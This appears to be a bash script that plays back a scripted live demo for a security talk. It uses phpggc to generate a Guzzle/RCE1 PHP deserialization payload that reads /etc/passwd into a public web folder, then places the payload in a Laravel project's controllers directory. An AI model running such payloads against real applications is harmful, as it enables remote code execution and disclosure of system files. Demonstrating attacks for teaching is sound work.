#!/bin/bash

cd /home/liam/Projects/talks/hackthesystem/tools/phpggc

echo '[liam@liam-laptop hackthesystem]$ ./phpggc Guzzle/RCE1 system "cat /etc/passwd > ../../../public/passwd" > payload'

sleep 5
./phpggc Guzzle/RCE1 system "cat /etc/passwd > ../../../public/passwd" > payload

echo '[liam@liam-laptop hackthesystem]$ mv payload ../../laravel/app/Http/Controllers/'

sleep 2;
mv payload ../../laravel/app/Http/Controllers/

